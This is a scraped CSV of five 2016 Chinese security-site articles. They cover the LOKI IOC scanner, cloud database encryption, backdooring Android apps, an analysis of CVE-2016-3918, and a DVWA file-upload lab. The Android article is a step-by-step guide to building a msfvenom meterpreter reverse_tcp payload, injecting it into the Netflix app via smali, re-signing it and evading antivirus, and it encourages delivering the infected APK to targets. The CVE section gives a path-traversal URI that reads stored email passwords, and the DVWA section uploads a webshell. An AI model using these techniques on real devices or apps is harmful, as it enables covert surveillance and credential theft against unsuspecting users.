"5ccbfb0c4f2f0a0a7a69c10a","BrowserExploit是一种先进的浏览器漏洞攻击包（通常指利用浏览器的漏洞来渗透目标），常见的比如IE的漏洞都可能导致目标设备在访问恶意页面后直接被GETSHELL，另外其他的比","blackhold","LOKI是一款APT入侵痕迹扫描软件，以入侵威胁指标(IOC)和黑客工具特征为对象，发现入侵事件和痕迹，其内置的指标特征来自公开发布的事件报告、取证分析和恶意样本等。LOKI由德国信息安全公司Bsk-Consulting开发。LOKI GitHub：https://github.com/Neo23x0/LokiLOKI支持以下四种检测模式：*匹配文件路径和文件名的IOC检测*匹配文件数据和进程内存的YARA恶意软件规则检测*匹配已知恶意软件的MD5 /SHA1/SHA256哈希值检测*匹配C&amp;C终端连接的网络检测其它方式检测：*进程异常检测（基于sysforensics)*SWF压缩文件检测*SAM转储检测*Regin木马文件检测（使用命令 -reginfs)运行：（1）克隆LOKI的github库（如果只是下载ZIP文件，请记得下载IOC特征签名子库 signature-base）（2）提供扫描对象（移动介质、网络共享、文件夹等）（3）以管理员方式按照命令运行loki.exeLOKI内置的威胁特征库（IOC):*“方程式组织”Equation Group APT恶意样本-（包括哈希值、卡巴斯基分析的YARA规则和10个通用规则）*Carbanak APT-卡巴斯基分析的恶意样本哈希值和文件名IOC*Arid Viper APT-趋势科技分析的恶意样本哈希值*Regin恶意软件（GCHQ/NSA/FiveEyes相关)-其中的Legspin和Hopscotch模块IOC*QUERTY 恶意软件（FiveEyes相关）-键盘记录模块IOC *Skeleton Key APT（国家支持攻击相关）-恶意软件IOC*WoolenGoldfish APT-SHA1哈希值和YARA规则*OpCleaver APT（伊朗相关APT活动）-IOC*其它180多个黑客工具YARA规则*其它600多个网页后门YARA规则*大量匹配的可疑文件签名*……LOKI收费版：LOKI的收费版本软件THOR，规则库更强大，扫描功能更深入，请参考THOR","2016-08-30 18:58:03","安全工具","LOKI：一款APT威胁指标扫描软件","http://nsoad.com/Security-tools/20160830/tools-332.html"
"5ccbfb164f2f0a0a7a69c10b","本 文根据目前国内外数据库安全的发展现状和经验，结合亚马逊AWS[1]、阿里云、腾讯云、UCloud、华为云等国内外云服务厂商，和IBM、微软等IT 巨头的云服务情况，从云数据库","dalamar","本 文根据目前国内外数据库安全的发展现状和经验，结合亚马逊AWS[1]、阿里云、腾讯云、UCloud、华为云等国内外云服务厂商，和IBM、微软等IT 巨头的云服务情况，从云数据库安全角度，介绍了云环境下数据库安全四种技术路线与安全模型架构，和云数据库安全的关键技术，适合从事云安全、云计算、数据安全等相关人员和安全爱好者学习探讨。 本文来自安华金和。每个公司对私有云、公有云的定义都不一样，但是CIO们却在不断重演莎翁经典对白：“公有云还是私有云，这是个问题”，政府、企业、金融、公共事业等都在建设或者规划上云。引发这一问题的核心是：云环境的安全合规性问题，也就是云环境的法规遵从、云数据的安全如何保障、云环境风险管理。云数据（库）安全之技术路线从 法规遵从和企业、个人敏感信息防护的角度，相比私有云环境和传统企业IT环境，公有云和混合云环境中的数据面临着前所未有的，来自开放环境和云运维服务环 境的安全挑战。笔者认为抓住主要矛盾，围绕核心敏感数据，进行最彻底有效的加密保护，比较典型的敏感数据包括身份证号、姓名、住址、银行卡、信用卡号、社 会保险号等等，以及企业的核心资产数据。在此观点下，笔者提出以加密保护为基础的技术路线：    以敏感数据加密为基础    以安全可靠、体系完善的密钥管理系统为核心    以三权分立、敏感数据访问控制为主要手段    辅助数据库防火墙、数据脱敏、审计等边界系统，规范和监控数据的访问行为云数据（库）安全之模型和架构实现以敏感数据加密为基础的技术路线，最关键的是“密钥由谁控制、在哪管理”；同时需要解决数据加密防护和密钥管理引起的对系统运行效率，系统部署和改造的代价，自动化运维的影响等一系列问题。对此，亚马逊AWS的解决方案中采用多种密钥管理模型：模型A：加密方法，密钥存储，密钥管理全部由用户控制，典型的是整个KMS[2]（密钥管理系统）部署在用户的数据中心。模型B：与模型A中的加密方法是一样的，区别在于密钥的存储是在云的KMS而不是在用户端的数据中心。模型C：本模型提供了完整的服务器端加密，加密方法和密钥的管理对于用户是透明的。AWS云数据安全模型                                     核心机制            安全性                                    模型A            密钥的存储和管理完全掌握在用户手上，“云”无法获得密钥或对用户的数据进行加密、解密            安全性最好                            模型B            KMS负责生成和存储密钥，负责进行加解密操作；但不负责密钥生命期的管理，访问控制，密钥轮转等            密钥的安全性由云的KMS保障                            模型C            完全是服务器端加密，对用户是透明的            数据的安全完全由云的安全性保证            围绕三种安全模型，可以在多个层上实现数据加密防护—多层数据加密防护架构，具体如下：1、 磁盘加密：采用的是Block-Level加密技术，需要云存储卷采用Block存储机制，例如AWS的EBS[3]，阿里云的ECS[4]等。这种加密最大的好处在于，它对操作系统是透明的。2、 文件加密：通过堆叠在其它文件系统之上（如 Ext2, Ext3, ReiserFS, JFS 等），为应用程序提供透明、动态、高效和安全的加密功能。典型的是用于加密指定的目录。需要关注的是这种加密方式可能会产生较大的性能损失。3、 数据库加密：（1） 以亚马逊AWS的RDS[5]为例，典型的是使用DBMS[6]提供的数据库透明加密，自动的对数据库表空间数据进行加密，密钥管理也是由DBMS提供的 API或组件实现，应用透明。由于RDS没有对外开放RDS用于存储数据的磁盘，因此前面提到的“透明”磁盘、文件加密技术无法在RDS上使用。（2）对 于用户在云上自行部署使用的DBMS，可以使用第三方专业数据库加密厂商提供的产品，如安华金和的数据库保险箱DBCoffer，可提供应用透明的按列加 密能力，独立的密钥管理、三权分立、静态数据掩码能力。4、 应用层加密：在数据到达数据库和RDS之前，甚至发送到云端之前，实时保护用户的敏感数据；这里关键需要提供良好的应用透明性，保证绝大多数应用无需改造。云用户（企业）没有必要信任云计算提供商以保护企业的数据安全。数据安全是由企业自己控制的。5、 密钥管理和加解密组件：作为数据加密保护的核心组件，KMS负责进行密钥生成、管理和销毁，并提供加解密能力；同时根据需要提供密钥的生命期管理、开放的API接口。综上，云用户（企业）可以根据自身的安全合规性需求，选择适合的云数据安全模型和相应的数据安全技术（产品），对敏感数据进行加密防护。多层云数据加密防护架构云数据（库）安全之关键技术上文笔者提出了一套云环境下的“多层数据加密防护架构”。下面针对实现该安全防护架构与相关关键技术进行具体分析。需要说明的是，由于整盘加密和TDE[7]属于云服务商和数据库厂商的范围，不在本文中讨论。KMS密钥管理和加解密算法密钥管理包含了密钥的创建、存储、生命期管理、保护。密钥的安全性直接决定了加密数据的安全性。建议密钥独立存储，并采用根密钥保护，根密钥受硬件加密卡保护，或者被KMS服务的密码保护。密钥安全体系KMS密钥管理通过用户的口令保护主密钥，口令正确主密钥解密；主密钥对密钥文件进行保护，只有主密钥成功解密后，密钥文件才能使用，最后通过密钥文件生成可用的密钥。加解密算法方面，除了必要的强加密算法（如AES256）和相关机构认证的硬件加密算法外，这里特别需要提出，为了实现应用的透明性，需要根据应用系统的需求提供专门的加密算法，如FPE[8]，Tokenization，SSE[9]等。FPE加密算法，是一种格式保留的加密算法，主要面向身份证、银行卡号、信用卡号、社会保险号等具有数据特征的信息进行加密，该算法加密后的数据能够保留原有的数据格式，从而对应用的业务逻辑不会产生任何影响，保证了应用的透明性。Tokenization，是一种数据掩码算法。与FPE[8]类似，通过对数据的“扰乱”，并保留数据的原有格式，达到加密的效果，同时保证应用的透明性。FPE加密算法的效果数据库透明加密数据库透明加密是按列对数据进行加密的，针对指定的列，采用指定的加密算法和密钥、盐值等进行加密处理。加密后的数据以密文的形式存储在DBMS[7]的表空间中。只有经过授权的用户才能看到明文数据，并且授权也是按列进行的，这种方式具备很好的灵活性和安全性。非授权用户，将无法读取加密列（查询）和更改加密列的数据。权限管理上，数据库透明加密采用了分权的机制，实现了三权分立，有效制约了数据库管理员（DBA）这样的特权用户对数据的访问。同时这种保护又是透明的，不会对管理员的日常工作造成不便。最重要的是数据库透明加密应用透明，应用系统和外围维护工具无需改造，涵盖SQL语句透明、存储程序透明、开发接口透明、数据库对象透明、管理工具透明。数据库透明加密防护技术优势：    对应用系统和数据库管理工具透明    对数据库帐户细粒度控制，包括DB用户，客户端IP，客户端MAC地址，应用程序或工具等    对敏感数据访问细粒度审计限制：    需要针对不同的数据库分别实现    需要实现专门的密文索引技术和透明访问技术，以满足性能和应用透明性    无法适用于RDS、用户在ECS上部署的DBMS实例应用层透明加密应用透明加密分为两种实现技术：JDBC[10]/ODBC[11]加密驱动，和云访问安全代理。其中最关键的是用于支撑应用透明的加密技术：FPE、Tokenization。1、JDBC/ODBC加密驱动应 用层JDBC/ODBC加密驱动，可以通过在原有DBMS提供的JDBC/ODBC上，以Wrapper方式实现，部署时替换JDBC/ODBC加密驱 动，实现对应用透明的数据加解密，实现数据在到达DBMS/RDS之前进行加密，和数据离开DBMS/RDS到达Application之后进行解密，最 终保证多数应用系统无需改造；同时在JDBC/ODBC加密驱动层实现独立的权限控制，密钥的获取。对敏感数据，通过JDBC/ODBC加密驱动实现完整的敏感数据访问审计能力。JDBC/ODBC加密驱动技术优势：    实现按字段加密，数据在到达DBMS/RDS之前就完成加密，安全性好    实现对应用的透明性，只需更换JDBC驱动即可完成    实现对数据库帐户细粒度控制，包括DB用户，客户端IP，客户端MAC地址，应用程序或工具等    部分实现应用用户控制，包括应用帐号、应用客户端的IP等限制：    对第三方数据工具（如PLSQL，TOAD等）无法实现透明，数据为密文    对服务器端程序，如存储过程、驻留在DBMS主机的自动化脚本等，无法实现透明    需要针对不同的数据库实现相应的JDBC/ODBC Wrapper2、云访问安全代理云访问安全安全代理（CASB），往往采用的是应用网关的方式，作为HTTP或HTTPS的反向代理服务网关，对HTTP页面中的敏感数据进行加密和Tokenization两种不同的保护方式。通过处理HTTP的请求和响应，实现面向字段的数据和上传内容的加密和解密，实现在数据发送到云端之前进行加密，密文数据离开云端到达客户端之前进行解密。云访问安全代理网关典型部署在用户数据中心侧，用户完全控制数据的加密密钥和加解密过程。可以采用任意的inline proxy方式进行部署。云访问安全代理网关可以提供细致的面向应用系统用户和组的访问控制能力，同时提供面向应用系统用户的细粒度访问审计能力。云访问安全代理技术优势：    实现按字段的加密，可以在数据到达云端之前就完成加密，安全性最好    具有高安全性，能够提供面向应用用户的解密权限控制，有效防止DBA的高权限和SQL注入攻击行为    最大限度满足合规性能力限制：    对应用系统可能无法实现真正的应用透明，需要对应用进行部分改造    对第三方数据工具（如PLSQL，TOAD等）无法实现透明，数据为密文    对服务器端程序，如存储过程、驻留在DBMS主机的自动化脚本等，无法实现透明文件级透明加密防护文件级透明加密防护通过在云主机操作系统上部署专门的加解密agent，实现对专门的数据文件或卷（Volume）的加解密。对操作系统帐户具有权限控制能力。只有专门的DBMS系统帐户才有对文件或卷进行加解密。文件级透明加密防护技术优势：    对数据库系统（DBMS）和应用透明    同时支持结构化和非结构化文件的加密    有效控制操作系统用户的访问，满足通常的控制需求限制：    无法提供细粒度的数据访问审计能力    需要针对不同的操作系统平台提供专门的agent    无法控制数据库帐户对敏感数据的访问数据自动脱敏随着云计算、弹性计算的广泛使用，会出现两种系统研发和测试的趋势：1）系统研发和测试在本地环境完成，然后部署在云端。2）系统研发和测试也在云端进行，充分利用云端的弹性计算资源，和方便简洁的云化部署能力。以上无论哪种方式，都面临将生产数据全部或部分转移到测试和研发环境中，出于合规性和安全性需求，转移的数据必须进行“脱敏”处理。数据自动脱敏技术能够对测试库中的数据、迁移过程中的数据、导出成文件的数据进行“脱敏”处理；并能保证数据关系一致性，例如分散在不同表中的相同身份证号数据脱敏后仍然是相同的。数据自动脱敏技术数据库防火墙数据库防火墙，是基于数据库协议分析与控制技术的数据库安全防护技术。基于主动防御机制，数据库防火墙实现了对数据库的访问行为控制、危险操作阻断、可疑行为审计。是集数据库IPS、IDS功能为一体的综合数据库安全防护技术。数据库防火墙技术实施云数据（库）防护的6个步骤由于云环境、企业云应用系统、核心数据的复杂性，选择适合的云数据保护方案变得尤为重要。那么什么样的方案是适合的？笔者认为应该涵盖以下几个关键点：（1）满足安全需求和相关法规；（2）对各种危害来源进行有效防护；（3）可接受的部署和维护复杂性。因此，为了保护云端的数据，需要有计划、有步骤的实施云数据（库）安全防护，这里结合前面的架构和关键技术，提出以下实施云数据（库）防护的6个基本步骤：步骤1：分析并确定需要保护的关键数据在对云数据进行保护前，首先需要准确的分析哪些数据需要保护，和为什么要保护这些数据；评估和划分哪些数据需要放置在云端，从而确定哪些数据是关键的必须保护的数据，例如用户身份证号码、银行卡或信用卡号码、社保号码等。另一个需要关注的就是法规遵从性需求。步骤2：选择适合的技术方案和加密算法作为云数据防护是否能够成功实施的关键，企业需要在关键数据的安全性、保持云应用系统的功能可用性，和系统可维护性方面综合考虑，来确定适合企业需要的加 密保护的技术方案。下面的两张图表对前面提到的加密防护的关键技术能够提供的防护效果，安全性和部署复杂性进行了对比，供读者参考。多层云数据加密防护效果分析安全性和实施部署复杂性分析加 密方法的选择也很重要，这里举个典型例子，在很多应用系统中会对银行卡号数据进行格式校验，如果数据不符合格式会造成应用系统无法接受“错误”的银行卡号 数据，因此对银行卡号加密同时，还需要保留其格式特征，可供选择的加密算法包括FPE和Tokenization。而姓名等数据则可以采用AES256等 更通用的加密算法。步骤3：保护好数据的加密密钥为了保护密文数据不会被非法窃取，避免云服务厂商和第三方维护人员访问到明文数据，最好的做法是将密文数据的密钥控制在云用户自己手中；读者可以参考前面的图1云数据安全模型和表1 安全模型对比。步骤4：实施必要的防数据泄漏措施虽然采取了必要的数据加密措施，但并不能彻底解决来自应用系统环境和云运维环境的安全威胁，典型的如来自云应用系统的SQL注入攻击、后门程序、利用数据库漏洞的攻击行为、第三方运维人员的误操作等。因此需要采用数据库防火墙这样的数据边界防护技术，利用其细粒度的访问控制、防攻击、防批量数据下载等特性，实现有效的防数据泄漏。步骤5：监控并审计数据的访问行为一方面，黑客攻击行为千变万化，另一方面，系统的复杂性带来的数据正常维护和管理行为往往也是不可预期的。因此，需要对重要数据的访问行为采取持续、及时的监控和审计，形成有效的风险报告提供给用户发现新的风险，帮助用户更好的进行数据保护。步骤6：利用自动脱敏防止测试环境数据泄漏除了云环境的数据防护，企业内部的测试环境也是一个重要的信息泄漏源，特别是需要“抽取”云端生产数据用于测试系统时；利用数据自动脱敏技术可以在有效的保护生产数据的同时，为测试环境提供可用的符合用户预期的测试数据。名词术语解释[1]AWS：本文主要指亚马逊的云计算服务[2] KMS：Key Managerment System，是一种基于软件或硬件加密卡技术的密钥管理系统，实现了密钥的生命期管理，提供丰富的加解密算法和接口[3] EBS：Elastic Block Store，本文主要指亚马逊的弹性块存储服务[4] ECS：Elastic Compute Service，本文指阿里的云服务器服务[5] RDS：Relational Database Service，本文主要是指阿里的云数据库服务[6] DBMS：Database Management System，数据库管理系统[7] TDE：Transparent Data Encryption，数据库透明加密，一种由数据库厂商提供的数据库加密技术[8] FPE：Format Preserving Encryption，是一种保留数据格式的加密算法，加密后的数据格式与明文数据的格式保持一致。[9] SSE：Searchable StrongEncryption，一种加密后数据可查询检索的加密算法，类似同态加密的结果[10] JDBC：Java Data Base Connectivity，一种用于连接多种关系型数据库的Java数据库连接[11]ODBC：Open Database Connectivity，开放数据库互连，是Microsoft提出的数据库访问接口标准","2016-07-29 14:36:32","网络安全","云数据库安全初探","http://nsoad.com/Article/Network-security/20160729/219.html"
"5ccbfb164f2f0a0a7a69c10c","简介这篇文章将会描述一种在Android可执行文件中种后门的方法。在接下来的动手操作部分，我将使用到开源工具Kwetza，没错作者就是我&hellip;&hellip;首先我会先介绍使用手工","Kong","简介这篇文章将会描述一种在Android可执行文件中种后门的方法。在接下来的动手操作部分，我将使用到开源工具Kwetza，没错作者就是我……首先我会先介绍使用手工过程实现向现有Android应用植入后门的方式，其后我再介绍并讨论Kwetza是如何自动完成这些手工步骤的。你可以通过Github repo找到Kwetza案例：感染正常Android应用我们想要感染一款正常的Android应用程序(APK)，当用户执行了这款看似正常的Android应用，payload将允许攻击者远程访问受影响设备，如网络摄像头，位置信息，手机短信等等。当然还有一个大前提便是该应用程序的行为以及功能与正常的Android应用一致，不会引起用户的警觉。Step 1：Payload这部分十分简单，使用msfvenom就好。我们先来生成一个payload：msfvenom -p android/meterpreter/reverse_tcp LHOST=10.42.0.211 LPORT=4444 R &gt; beard.apk现在这款Android应用便能够在目标设备上为我们提供一个meterpreter会话。对于移动版本杀毒产品，这款payload的表现如何呢？根据我们的分析，在41款杀毒产品中只有17款检测出beard.apk。额不是百分百的过杀软还是有些担心，这个payload并不是才出现并且也没有什么特殊之处。为何不是百分百的检测出，我也挺纳闷的。Step 2:减负对于这一步骤，如果我们着眼于beard.apk就会发现它有些臃肿，所以我们想通过一个单独的Java Class来完成这个重担。首先我将逆向beard.apk，并将所有函数都放进一个名为 AssistActivity.java的单独Java Class中。如上图所示，beard.apk包含了多个文档，这些文档能让你的meterpreter玩的更精彩。然而我想把所有的东西都放到一个文件中，这样会更有意义一点。请注意该payload的Main activity通过调用Payload class的start方法，进而使用其他类文件。我们将这些其他类文件的功能重构到AssistActivity文件。Step 3: 监测目标我们有一个单独的文件来代表我们payload了。接下来我们需要一个目标应用，我选择了Netflix。对于监测方面我希望在用户点击Netflix应用icon图标的那一刻payload就能够得到执行。如何实现呢？很简单，将目光看向AndroidManifest.xml文件，它将告诉我们在应用启动时都有哪些Activity(即Java class)会被执行。接着在mainfest中搜索“MAIN”和“LAUNCHER”属性，我们就能得知当系统执行应用时会用到的activity以及相关文件。btw，为了到这一步，你需要对下载的Netflix APK执行以下命令进行反编译操作：apktool d Netflix.apkStep 4: 继承Okay，我们有两个被标记为可执行的文件com.netflix.mediaclient.ui.launch.UIWebViewActivitycom.netflix.mediaclient.ui.launch.UIWebViewTabletActivity没关系，根据进一步分析代码。我们发现这两个类都继承于一个父类，依次执行所有的启动代码等。如上图所示，我们看到有两个入口点都是继承于“com.netflix.mediaclient.ui.launch.LaunchActivity”。这也意味着当Netflix执行时该activity是最后执行的，这就是我们的注入点。Step 5: 优化我们了解了在何处注入我们的恶意代码。现在就要利用Smali了，目前我们的payload是由两个Smali文件进行描述的，AssistActivity.smali以及我们使用Apktool反编译beard.apk时生成的AssistActivity$1.class。接下来将两个文件移动到com/netflix/mediaclient.ui/launch目录中。现在我帮需要更新几个引用，比如包引用，以及使用了应用程序命名空间的对象引用。基本上对于AssistActivity的引用都应该是这样的：Lcom/netflix/mediaclient/ui/launch/AssistActivity而不是：Lsensepost/kwetza/AssistActivity我们需要确认两个Smali文件都应用了更改。Step 6: 注入至此目标目录中已经有我们的两个Smali文件，现在我们需要配置目标Activity(Netflix)来调用我们的代码。这就修改“com.netflix.mediaclient.ui.launch.LaunchActivity”来调用AssistActivity：AssistActivity.doThis(this);在Smali中：invoke-static {p0}, Lcom/netflix/mediaclient/ui/launch/AssistActivity;-&gt;doThis(Landroid/content/Context;)V在进一步讨论之前，我们要在目标activity中找一个地方注入我们的代码。要做到这点，我们需要分析LaunchActivity并且寻找onCreate方法。当关联对象实例化后，在这个方法中的所有代码都会被执行，在本例中为LaunchActivity。如上图所示，我们可以看到onCreate方法就在LaunchActivity中。如果你注意到行号，我们可以看到行号145到147是没有代码的。为了验证，我们打开相同文件后盯着它的Smali副本，LaunchActivity.smali.line 146invoke-static {p0}, Lcom/netflix/mediaclient/ui/launch/AssistActivity;-&gt;doThis(Landroid/content/Context;)V太棒了，我们成功将一行代码注入到LaunchActivity.smali。当Netflix app运行时将会看到我们的payload(AssistActivity)被执行。Step 7: 最后一步接下来我们需要对新修改的版本进行打包，签名，安装。打包新的apk:apktool b netflixDir生成一个keystore：keytool -genkey -v -keystore mykey.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000对apk进行签名：jarsigner -keystore mykey.keystore Netflix.apk alias_name -sigalg MD5withRSA -digestalg SHA1安装新的Apk:adb install Netflix.apk#Sooooooooo what??现在我们就有一份全新的Netflix Apk了，他将帮助我们从Android设备上获得一个meterpreter shell。让我们来看看杀软对它的态度：事实证明，经过感染的Netflix Apk未被杀软检测出问题。接下来看看当我们点击Netflix icon图标时会发生什么Okay我们得到meterpreter，但它能够做些什么事情呢？现在我们尝试通过Netflix应用被授权的权限来获取目标设备的摄像头以及麦克风(注意，我们没有对Netflix应用本身添加或者删除需要请求的权限，仅仅只是注入了恶意代码)，由于AndroidManifest.xml没有请求这个权限，所以不能打开设备摄像头。但是正常的Netflix应用会请求吗？从上图中我们得知，Netflix应用有向设备请求麦克风访问权限。&lt;uses-permission android:name=""android.permission.RECORD_AUDIO"" /&gt;简单来说我们无须再添加任何权限，就能获取设备的所有访问权限。正常的Netflix应用会请求联网以及麦克风权限，所以我们不需做任何事情就能获取设备麦克风的访问权限以及录音操作。将所有需要的权限都增加完以获得meterpreter所提供的所有功能，Netflix应用会是个啥样呢？不论是Netflix应用还是其他Android应用，meterpreter会话可以一直持续到手机锁上。为了结束meterpreter会话，用户需要准确的结束进程以及重启手机。从最近的测试来看meterpreter会话依旧很稳定。使用Kwetza自动化完成以上步骤讨论的东西需要一定的安卓逆向知识，并且会消耗你宝贵的时间。接下来这里就是推销时间了，我们的Kwetza就是一款可以自动化完成上述步骤的好工具。虽然已经有类似的工具backdoor-apk可以完成这项工作，但是Kwetza与现有的工具不同的是能更灵活的权限注入，以及可自定义的payload模版Step 1: 感染python kwetza.py targetApk.apk LHOST LPORT yes/notargetApk.apk=你希望感染的APK名称LHOST=监听IPLPORT=监听端口[yes]=“yes” 表示需要请求额外的权限, “no”表示利用应用默认的权限Step 2: 安装这一步骤就是发挥大家创造能力的时候了，现在你有一款包含payload的受感染Apk。该应用的功能看起来都正常，只是目标用户不知道而已。在下面的截图中，我们感染Eset的安卓杀毒应用。标准感染(未篡改Manifest中的权限)就能让你成功访问用户的摄像头以及其他权限。Kwetza需要两个重要的依赖，Python的BeautifulSoup以及ApkTool。都非常好设置，而且ApkTool使用默认配置就够了。Step 3: 完工你只需要将你的msf multihandler设置为指定的LHOST和LPORT，并将你的payload设置为“android/meterpreter/reverse_tcp”就ok咯。结语通过感染正常的Android应用，我们能够更直观的理解设备，用户以及杀软厂商对此类攻击的回应，并提醒他们针对移动领域的攻击真的是一块非常吸引人的大蛋糕。","2016-10-21 16:31:15","移动安全","如何用kwetza给安卓应用加后门","http://nsoad.com/Article/MobileSecurity/20161021/620.html"
"5ccbfb164f2f0a0a7a69c10d","谷歌近期对外公布了2016年10月的Nexus Security Bulletin ，这其中包含一个由360手机卫士阿尔法团队(Alpha Team)提交的电子邮件信息泄露漏洞（CVE-2016-3918 ），谷歌对此漏","silence","谷歌近期对外公布了2016年10月的Nexus Security Bulletin ，这其中包含一个由360手机卫士阿尔法团队(Alpha Team)提交的电子邮件信息泄露漏洞（CVE-2016-3918 ），谷歌对此漏洞的评级为高危险等级。该漏洞可导致恶意应用获取到电子邮件内的数据，可能是电子邮件内容、电子邮件附件甚至账号密码。目前谷歌已经修复该漏洞并向OEM厂商推送了补丁，本文将对此漏洞进行分析。    本文的测试环境和代码版本如下：SDK Version: 23, Android 6.0.1 Build: MOB30Y Branch: android-6.0.1_r60漏洞成因在Android AOSP的Email应用程序的源码中，我们可以看到在AndroidManifest.xml 文件中存在名为AttachmentProvider的ContentProvider。&lt;provider android:name="".provider.AttachmentProvider"" android:authorities=""com.android.email.attachmentprovider"" android:grantUriPermissions=""true"" android:exported=""true"" android:readPermission=""com.android.email.permission.READ_ATTACHMENT"" /&gt;其主要属性如下：exported true即对外开放authorities com.android.email.attachmentprovider 即URI唯一标识readPermission com.android.email.permission.READ_ATTACHMENT 即读取需要此权限通过查询我们可以了解到com.android.email.permission.READ_ATTACHMENT权限的protectionLevel为 dangerous，即可被第三方应用获取到。&lt;permissionandroid:name=""com.android.email.permission.READ_ATTACHMENT""android:permissionGroup=""android.permission-group.MESSAGES""android:protectionLevel=""dangerous""android:label=""@string/permission_read_attachment_label"" android:description=""@string/permission_read_attachment_desc""/&gt;在确定此ContentProvider可以被第三方应用接触到之后，我们定位AttachmentProvider的源码。 源码路径如下：/packages/apps/Email/provider_src/com/android/email/provider/AttachmentProvider.java通过阅读源码我们可以发现AttachmentProvider中实现了一个public的openFile 接口，该接口会返回一个ParcelFileDescriptor类型的对象供调用者打开文件。public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {进入openFile接口立刻就会判断mode值是否为 ""w"" ，如果为w则会返回一个可写的文件描述符。但在返回之前，函数的实现代码进行了权限检查，如果调用者没有com.android.email.permission.ACCESS_PROVIDER 权限的话是会抛异常的。而该权限的声明如下：&lt;permission android:name=""com.android.email.permission.ACCESS_PROVIDER"" android:protectionLevel=""signature"" android:label=""@string/permission_access_provider_label"" android:description=""@string/permission_access_provider_desc""/&gt;可以看到该权限是无法被第三方应用获取到的，所以获取可写的权限是不可行的。 继续往下分析代码。List&lt;String&gt; segments = uri.getPathSegments();String accountId = segments.get(0);String id = segments.get(1);String format = segments.get(2);if (AttachmentUtilities.FORMAT_THUMBNAIL.equals(format)) { int width = Integer.parseInt(segments.get(3)); int height = Integer.parseInt(segments.get(4)); ...}else { return ParcelFileDescriptor.open( new File(getContext().getDatabasePath(accountId + "".db_att""), id), ParcelFileDescriptor.MODE_READ_ONLY);}接下来一系列代码会从uri.getPathSegments()中分割开不同的字段，并从中读取相应的配置参数。 当 format参数不等于""THUMBNAIL""时，该代码将会直接返回一个getDatabasePath()该目录下名为id 的文件的文件描述符。 而id参数是上面从uri.getPathSegments().get(1) 得到的，获取之后则没有任何处理。 uri.getPathSegments()方法的作用是将字符串以""/""进行分割，但由于其没有对经过url    编码的字符串进行解码，导致在处理过程中，对于/编码之后的%2f则将不做处理，从而绕过getPathSegments的分割。漏洞利用根据上面我们对于代码的分析，可以得出AttachmentProvider的uri如下：content://accountId/id/format/width/height我们如果想利用此漏洞读取数据，为使程序流能够成功运行至目标位置，需要构造如下uricontent://com.android.email.attachmentprovider/1/file_position/1/1/1而且，getDatabasePath()的目录是/data/user/0/com.android.email/databases/，如果我们要读取Email 邮件的数据，则需要跳转至目标目录/data/data/com.android.email/来读取Email应用的sqlite数据库文件，我们需要构造如下 uri:content://com.android.email.attachmentprovider/1/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.android.email%2Fdatabases%2FEmailProvider.db/1/1/1而EmailProvider.db中存储了我们已登陆账户的账户名和密码，对应的结构为HostAuth表的login和password 字段。 我们构造的PoC截图如下：  总结至此，CVE-2016-3918漏洞的分析和利用已经完成。 经过我们的测试，目前多款主流手机机型的自带电子邮件客户端都存在该问题，如小米 NOTE、华为P9、三星S5等机型，为了账户的安全，请使用存在漏洞手机的用户暂停使用电子邮件客户端并清除账户信息，换至其他邮件客户端。","2016-10-17 16:22:08","网络安全","一个漏洞泄露你的邮箱的所有秘密","http://nsoad.com/Article/Network-security/20161017/583.html"
"5ccbfb164f2f0a0a7a69c10e","目前，最新的DVWA已经更新到1.9版本（http://www.dvwa.co.uk/），而网上的教程大多停留在旧版本，且没有针对DVWA high级别的教程，因此萌发了一个撰写新手教程的想法，错误的地方还请大家指正。","kong","目前，最新的DVWA已经更新到1.9版本（http://www.dvwa.co.uk/），而网上的教程大多停留在旧版本，且没有针对DVWA high级别的教程，因此萌发了一个撰写新手教程的想法，错误的地方还请大家指正。    DVWA简介DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。DVWA共有十个模块，分别是Brute Force（暴力（破解））Command Injection（命令行注入）CSRF（跨站请求伪造）File Inclusion（文件包含）File Upload（文件上传）Insecure CAPTCHA （不安全的验证码）SQL Injection（SQL注入）SQL Injection（Blind）（SQL盲注）XSS（Reflected）（反射型跨站脚本）XSS（Stored）（存储型跨站脚本）需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。  DVWA的搭建Freebuf上的这篇文章《新手指南：手把手教你如何搭建自己的渗透测试环境》（http://www.freebuf.com/sectool/102661.html）已经写得非常好了，在这里就不赘述了。之前模块的相关内容Brute ForceCommand InjectionCSRFFile Inclusion本文介绍File Upload模块的相关内容，后续教程会在之后的文章中给出。File UploadFile Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。    下面对四种级别的代码进行分析。Low服务器端核心代码&lt;?php if( isset( $_POST[ 'Upload' ] ) ) {     // Where are we going to be writing to?     $target_path  = DVWA_WEB_PAGE_TO_ROOT . ""hackable/uploads/"";     $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );     // Can we move the file to the upload folder?     if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {         // No         echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;';     }     else {         // Yes!         echo ""&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;"";     } } ?&gt; basename(path,suffix)        函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。漏洞利用文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知。不幸的是，这里三个条件全都满足。上传文件hack.php（一句话木马）上传成功，并且返回了上传路径    打开中国菜刀，右键添加，地址栏填入上传文件所在路径http://192.168.153.130/dvwa/hackable/uploads/hack.php，参数名（一句话木马口令）为apple。   